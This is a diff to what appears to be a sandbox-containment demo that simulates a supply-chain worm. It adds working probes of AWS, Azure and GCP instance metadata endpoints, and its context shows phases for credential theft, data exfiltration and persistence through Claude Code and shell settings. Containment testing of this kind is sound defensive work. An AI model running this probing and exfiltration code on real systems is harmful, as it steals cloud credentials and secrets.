@@ -90,6 +90,37 @@ def run():
         print(f"{_dots(k)} {v}")
     stolen["recon"] = recon
 
+    # ── Phase 1b: Cloud metadata probing (real Mini Shai-Hulud) ──────
+    _header("Phase 1b: Cloud Metadata (IMDS)")
+    metadata_targets = [
+        ("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/", {}),
+        ("Azure IMDS", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+         {"Metadata": "true"}),
+        ("GCP metadata", "http://169.254.169.254/computeMetadata/v1/",
+         {"Metadata-Flavor": "Google"}),
+    ]
+    stolen_metadata = {}
+    for name, url, headers in metadata_targets:
+        try:
+            req = Request(url)
+            for k, v in headers.items():
+                req.add_header(k, v)
+            with urlopen(req, timeout=2) as resp:
+                body = resp.read().decode()[:200]
+                print(f"{_dots(name)} STOLEN ({len(body)} B)")
+                stolen_metadata[name] = body
+        except OSError as e:
+            errno = getattr(e, "errno", None) or getattr(getattr(e, "reason", None), "errno", None)
+            if errno == 5:
+                print(f"{_dots(name)} BLOCKED (link-local policy)")
+            elif isinstance(e, socket.timeout):
+                print(f"{_dots(name)} TIMEOUT (no metadata service)")
+            elif errno == 111:
+                print(f"{_dots(name)} NOT AVAILABLE")
+            else:
+                print(f"{_dots(name)} BLOCKED")
+    stolen["metadata"] = stolen_metadata
+
     # ── Phase 2: Credential theft ────────────────────────────────────
     _header("Phase 2: Credential Theft")
     stolen_files = {}
@@ -140,18 +171,20 @@ def run():
         req.add_header("Content-Type", "application/json")
         with urlopen(req, timeout=5) as resp:
             print(f"  status: SENT (HTTP {resp.status})")
-    except Exception as e:
-        msg = str(e)
-        if "Network is unreachable" in msg:
+    except OSError as e:
+        errno = getattr(e, "errno", None) or getattr(getattr(e, "reason", None), "errno", None)
+        if errno == 5:
+            print("  status: BLOCKED -- Connection denied (loopback policy)")
+        elif errno == 101:
             print("  status: BLOCKED -- Network is unreachable")
-        elif "Connection refused" in msg:
+        elif errno == 111:
             print("  status: BLOCKED -- Connection refused")
-        elif "timed out" in msg:
+        elif isinstance(e, socket.timeout):
             print("  status: BLOCKED -- Connection timed out")
-        elif "nodename nor servname" in msg or "Name or service not known" in msg:
+        elif errno == -2 or errno == -3:
             print("  status: BLOCKED -- DNS resolution failed")
         else:
-            print(f"  status: BLOCKED -- {msg}")
+            print(f"  status: BLOCKED -- {e}")
 
     # ── Phase 5: Persistence ─────────────────────────────────────────
     _header("Phase 5: Persistence (Claude Code + shell)")
@@ -242,18 +275,21 @@ def run():
     # ── Summary ──────────────────────────────────────────────────────
     n_files = len(stolen_files)
     n_env = len(stolen_env)
+    n_meta = len(stolen_metadata)
 
     print()
     print("=" * (W + 2))
-    if n_files > 0 or n_env > 0:
+    if n_files > 0 or n_env > 0 or n_meta > 0:
         print("  RESULT: Attack SUCCEEDED")
         print(f"    {n_files} credential file(s) stolen")
         print(f"    {n_env} environment variable(s) harvested")
+        print(f"    {n_meta} cloud metadata endpoint(s) reached")
         print(f"    {persistence_count} persistence mechanism(s) installed")
     else:
         print("  RESULT: Attack CONTAINED by Hyperlight sandbox")
         print("    0 credential files stolen")
         print("    0 environment variables harvested")
+        print("    0 cloud metadata endpoints reached")
         print("    0 persistence mechanisms installed")
         print("    All malicious actions were blocked by VM isolation.")
     print("=" * (W + 2))
